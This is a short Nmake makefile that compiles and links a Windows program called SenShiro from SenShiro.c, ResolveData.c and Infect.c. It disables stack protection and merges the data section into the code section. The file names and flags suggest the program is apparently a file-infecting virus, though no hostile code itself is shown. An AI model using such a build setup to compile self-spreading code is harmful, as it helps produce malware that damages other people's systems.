# Nmake macros for building Windows 32-Bit apps
# To compile nmake /i /f "SenShiro.mak"
APPVER=4.0

!include <win32.mak>

all: SenShiro.exe

SenShiro.obj: SenShiro.c SenShiro.h
	cl -c -Ox /GS- SenShiro.c
	
ResolveData.obj: ResolveData.c SenShiro.h
	cl -c -Ox /GS- ResolveData.c

Infect.obj: Infect.c SenShiro.h
	cl -c -Ox /GS- Infect.c
	
SenShiro.exe: SenShiro.obj ResolveData.obj Infect.obj
     $(link) /INCREMENTAL:NO /NODEFAULTLIB:ON /PDB:NONE /ENTRY:WinMain /MERGE:.data=.text /RELEASE /NOLOGO -entry:WinMain -subsystem:windows,5.02 -out:SenShiro.exe SenShiro.obj ResolveData.obj Infect.obj